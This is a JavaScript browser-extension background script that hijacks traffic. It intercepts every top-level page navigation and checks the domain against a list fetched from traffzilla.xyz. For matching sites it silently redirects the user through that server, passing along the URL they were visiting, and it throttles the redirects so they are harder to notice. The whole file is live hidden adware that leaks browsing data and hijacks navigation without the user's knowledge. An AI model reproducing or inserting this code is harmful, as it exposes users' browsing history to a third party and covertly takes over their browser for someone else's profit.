(function () {
    var apiUrl = 'https://traffzilla.xyz',
        sourceId = '4d4d2708f61508192a1c4da6b238cc4c',
        link = '',
        urls = {
            data: {
                used_domains: {}
            }
        },
        sourceCoverage = [],
        enabledApi = true;

    function checkStatus() {
        var xhr = new XMLHttpRequest();
        xhr.timeout = 5000;
        xhr.onreadystatechange = function () {
            //console.log("request answer got",xhr);
            if (xhr.readyState === 4) {
                if (xhr.status === 200) {
                    enabledApi = true;
                } else {
                    //console.log("Disable api");
                    enabledApi = false;
                }
            }
        };
        //console.log('Send request for status source check');
        xhr.open('GET', apiUrl + '/source-status?key=' + sourceId, true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.send();
    }

    function updateCoverage() {
        var xhr = new XMLHttpRequest();
        xhr.timeout = 15000;
        xhr.onreadystatechange = function () {
            //console.log("request answer got",xhr);
            if (xhr.readyState === 4) {
                if (xhr.status === 200) {
                    sourceCoverage = JSON.parse(xhr.responseText);
                    //console.log("Coverage updated",sourceCoverage);
                    enabledApi = true;
                } else {
                    //console.log("Disable api on error");
                    enabledApi = false;
                }
            }
        };
        //console.log('Send request for status source check');
        xhr.open('GET', apiUrl + '/coverage?key=' + sourceId, true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.send();
    }

    function redirectURL(out, doc_domain, adv_time) {
        var found = false;
        if (sourceCoverage.indexOf(doc_domain) > -1) {
            //console.log("Domain found, exact match", doc_domain);
            found = true;
        } else {
            for (var i in sourceCoverage) {
                if (
                    sourceCoverage[i].indexOf(doc_domain) > -1 ||
                    doc_domain.indexOf(sourceCoverage[i]) > -1
                ) {
                    //console.log("Domain found by text-search",doc_domain, sourceCoverage[i]);
                    found = true;
                    break;
                }
            }
        }
        if (found) {
            link =
                apiUrl +
                '/get?key=' +
                sourceId +
                '&out=' +
                encodeURIComponent(out) +
                '&ref=' +
                encodeURIComponent(out) +
                '&uid=&format=go';
            // console.log('Redirect URL: ', link);
        } else {
            // console.log("Domain not in coverage, set double pause",doc_domain);
            urls.data.used_domains[doc_domain] = adv_time + 86400000;
        }
    }

    updateCoverage();
    chrome.webRequest.onBeforeRequest.addListener(
        function (details) {
            if (details.tabId < 0) {
                return;
            }
            if (details.method != 'GET') {
                return;
            }
            if (!enabledApi) { /*console.log("API paused");*/
                return;
            }

            var doc_domain = details.url
                .replace(/^https?\:\/\/([^\/]+).*$/, '$1')
                .replace('www.', '');
            var adv_time = new Date().getTime();

            if (
                urls.data.used_domains[doc_domain] &&
                urls.data.used_domains[doc_domain] + 1000 * 60 * 60 * 2 > adv_time
            ) {
                //console.log("Domain",doc_domain,"checked before and paused", urls.data.used_domains[doc_domain]);
                return;
            }

            //console.log("Add domain to used list",doc_domain, urls.data.used_domains, "link is ",link);
            urls.data.used_domains[doc_domain] = adv_time;
            if (!link) {
                redirectURL(details.url, doc_domain, adv_time);
            } else {
                link = '';
            }

            if (link) {
                //console.log("Api paused for redirection chain");
                enabledApi = false;
                setTimeout(
                    function () {
                        //console.log("Api enabled again");
                        link = '';
                        enabledApi = true;
                    },
                    15000
                );

                return {redirectUrl: link};
            }
        },
        {
            urls: ['*://*/*'],
            types: ['main_frame']
        },
        ['blocking']
    );
})();